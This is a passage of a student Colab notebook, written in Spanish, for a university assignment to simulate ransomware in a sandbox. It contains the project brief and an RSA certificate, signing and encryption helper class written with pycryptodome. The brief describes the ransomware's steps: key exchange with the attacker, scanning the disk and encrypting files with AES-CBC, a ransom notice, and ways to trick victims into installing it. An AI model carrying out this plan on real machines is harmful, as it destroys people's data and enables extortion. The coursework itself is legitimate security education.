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)\n",
        "\n",
        "---"
      ],
      "metadata": {
        "id": "p8dgR5EuYzsF"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "##**Nombre y Códigos de los Estudiantes:**\n",
        "- Brancys Barrios - 200137096\n",
        "- Natalia de la Rans - codigo"
      ],
      "metadata": {
        "id": "XlBGPe_ZaRXm"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "El objetivo de este proyecto es desarrollar un ransomware básico en el que se\n",
        "apliquen todos los conceptos vistos a lo largo del curso"
      ],
      "metadata": {
        "id": "V_TyP8Q3asZV"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "## **Enunciado:**\n",
        "El objetivo de este proyecto es simular la operación de un ransomware siguiendo los siguientes lineamientos:\n",
        "\n",
        "1. **Instalación del Ransomware**:\n",
        "   - El ransomware debe instalarse en la máquina víctima con los permisos adecuados.\n",
        "\n",
        "2. **Conexión y Protocolo de Intercambio de Llaves**:\n",
        "   - El ransomware abrirá una conexión con una máquina operada por el atacante.\n",
        "   - Se utilizará el protocolo AKE v.2 para compartir un secreto común.\n",
        "     - Se deben generar certificados digitales para el atacante y la víctima, incluyendo identidad y llave pública.\n",
        "     - Las llaves públicas deben ser generadas utilizando RSA con 2048 bits.\n",
        "     - Los certificados se construirán como diccionarios con las llaves 'id' (identidad) y 'pk' (llave pública).\n",
        "     - Se utilizará el esquema de firma digital `pkcs1_15` de `Crypto.Signature`, aplicando hash y luego firma.\n",
        "     - Se utilizará el criptosistema `PKCS1_OAEP` de `Crypto.Cipher` para el cifrado y descifrado asimétrico.\n",
        "     - Se generará un par de llaves de corto plazo usando RSA con 2048 bits.\n",
        "\n",
        "3. **Cifrado de Archivos**:\n",
        "   - Usando el secreto común, el ransomware generará una llave simétrica mediante una KDF (Key Derivation Function).\n",
        "   - Se utilizará esta llave para cifrar archivos almacenados en la máquina víctima usando AES en modo CBC.\n",
        "\n",
        "4. **Notificación al Usuario**:\n",
        "   - El ransomware notificará a la víctima sobre el ataque y proporcionará instrucciones para recuperar los archivos (normalmente mediante un pago en criptomonedas).\n",
        "\n",
        "5. **Recuperación de Archivos**:\n",
        "   - Una vez realizado el pago, el atacante enviará las instrucciones para generar la llave a partir del secreto común para recuperar los archivos cifrados.\n",
        "\n",
        "## **Implementación y Recomendaciones**:\n",
        "- Implementar un código de prueba de concepto para los pasos 2, 3, 4 y 5.\n",
        "- La simulación debe realizarse sin conexión real vía sockets entre el cliente y la máquina del atacante.\n",
        "- Se recomienda utilizar Google Colab para la implementación.\n",
        "- Implementar un método para escanear y cifrar archivos en el disco de la máquina de Colab.\n",
        "- Notificar en Colab qué archivos se han cifrado y cuánto se debe pagar para descifrarlos.\n",
        "- Implementar una función que reciba las rutas de los archivos cifrados y proceda a descifrarlos.\n",
        "- Proponer e implementar una estrategia para verificar la integridad de los archivos afectados por el ransomware.\n",
        "\n",
        "## **Preguntas a Responder**:\n",
        "1. **Rol del Atacante**:\n",
        "   - Estrategias para que la víctima instale el ransomware en su máquina (implementación del paso 1).\n",
        "\n",
        "2. **Rol del Defensor**:\n",
        "   - Políticas y prácticas para garantizar la confidencialidad, integridad y disponibilidad de recursos informáticos en una organización, enfocadas en mitigar este tipo de ataques."
      ],
      "metadata": {
        "id": "7z4eDDc_1FlX"
      }
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Instalacion y uso de librerias"
      ],
      "metadata": {
        "id": "cOfR-hOd1WUG"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "%pip install pycryptodome"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "qbnxOo-sXeVW",
        "outputId": "b4b01d77-c797-4834-e493-2e7a9aadca14"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting pycryptodome\n",
            "  Downloading pycryptodome-3.20.0-cp35-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.1 MB)\n",
            "\u001b[?25l     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m0.0/2.1 MB\u001b[0m \u001b[31m?\u001b[0m eta \u001b[36m-:--:--\u001b[0m\r\u001b[2K     \u001b[91m━━━━━━━━━━\u001b[0m\u001b[91m╸\u001b[0m\u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m0.6/2.1 MB\u001b[0m \u001b[31m17.1 MB/s\u001b[0m eta \u001b[36m0:00:01\u001b[0m\r\u001b[2K     \u001b[91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[90m╺\u001b[0m\u001b[90m━━━━━━━\u001b[0m \u001b[32m1.7/2.1 MB\u001b[0m \u001b[31m24.2 MB/s\u001b[0m eta \u001b[36m0:00:01\u001b[0m\r\u001b[2K     \u001b[91m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[91m╸\u001b[0m \u001b[32m2.1/2.1 MB\u001b[0m \u001b[31m25.2 MB/s\u001b[0m eta \u001b[36m0:00:01\u001b[0m\r\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m2.1/2.1 MB\u001b[0m \u001b[31m16.2 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hInstalling collected packages: pycryptodome\n",
            "Successfully installed pycryptodome-3.20.0\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "#Librerias\n",
        "from Crypto.PublicKey import RSA\n",
        "from Crypto.Protocol.KDF import PBKDF2\n",
        "from Crypto.Signature import pkcs1_15\n",
        "from Crypto.Hash import SHA256\n",
        "from Crypto.Cipher import PKCS1_OAEP\n",
        "from Crypto.Random import get_random_bytes\n",
        "from Crypto.Cipher import AES\n",
        "from Crypto.Util.Padding import pad, unpad\n",
        "import uuid\n",
        "import os"
      ],
      "metadata": {
        "id": "IQ3GJo9LsqXJ"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Creacion de modelos"
      ],
      "metadata": {
        "id": "j6IA2I8B1izY"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "class User:\n",
        "\n",
        "  def __init__(self):\n",
        "    self._private_key= RSA.generate(2048)\n",
        "    self.public_key=self._private_key.public_key()\n",
        "    self._private_shortKey=RSA.generate(2048)\n",
        "    self.public_shortKey=self._private_shortKey.public_key()\n",
        "    self.generar_certificado()\n",
        "\n",
        "  def generar_certificado(self):\n",
        "\n",
        "    unique_id = uuid.uuid4()\n",
        "\n",
        "    cert={\n",
        "        'id':f\"{unique_id}.example.com\",\n",
        "        'public_key':self.public_key\n",
        "    } #(f\"{unique_id}.example.com\",self.key.publickey())\n",
        "\n",
        "    self.certificado=cert\n",
        "\n",
        "  def encrypt(self, key, message):\n",
        "    key=RSA.import_key(key)\n",
        "    cipher=PKCS1_OAEP.new(key)\n",
        "    return cipher.encrypt(message)\n",
        "\n",
        "  def decrypt(self, ciphertext, key=None):\n",
        "    if key:\n",
        "      key=RSA.import_key(key)\n",
        "    else:\n",
        "      key=self._private_shortKey\n",
        "    cipher=PKCS1_OAEP.new(key)\n",
        "    return cipher.decrypt(ciphertext)\n",
        "\n",
        "  def sign(self, message):\n",
        "    key=self._private_key\n",
        "    h = SHA256.new(message)\n",
        "    signature = pkcs1_15.new(key).sign(h)\n",
        "    return signature\n",
        "\n",
        "  def validate_signature(self, key, message, signature):\n",
        "    h=SHA256.new(message)\n",
        "    try:\n",
        "      pkcs1_15.new(key).verify(h, signature)\n",
        "      print(\"Firma valida\")\n",
        "      return True\n",
        "    except (ValueError, TypeError):\n",
        "      raise ValueError(\"La firma no es valida\")"
      ],
      "metadata": {
        "id": "r_-vay1U4oI6"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Simulacion AKE v.2"
      ],
      "metadata": {
